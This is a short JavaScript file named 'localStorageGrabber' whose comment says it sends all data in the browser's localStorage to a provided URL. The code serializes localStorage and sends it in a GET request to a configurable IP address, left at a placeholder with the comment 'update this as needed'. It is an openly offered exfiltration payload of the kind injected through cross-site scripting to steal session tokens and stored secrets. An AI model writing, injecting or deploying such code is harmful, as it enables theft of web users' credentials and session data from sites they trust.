/**
 *  localStorageGrabber
 *
 *  A function that sends all date in localstorage via an XMLHttpRequest
 *  to the provided URL.
 */

/**
 * update this as needed
 */
const ipAddress = '127.0.0.1';

// construct the target url
var url = `http://${ipAddress}/localStorage=`; 

// construct and send the request
var xmlHttp = new XMLHttpRequest();
xmlHttp.open('GET', url + JSON.stringify(localStorage), true);
xmlHttp.send();
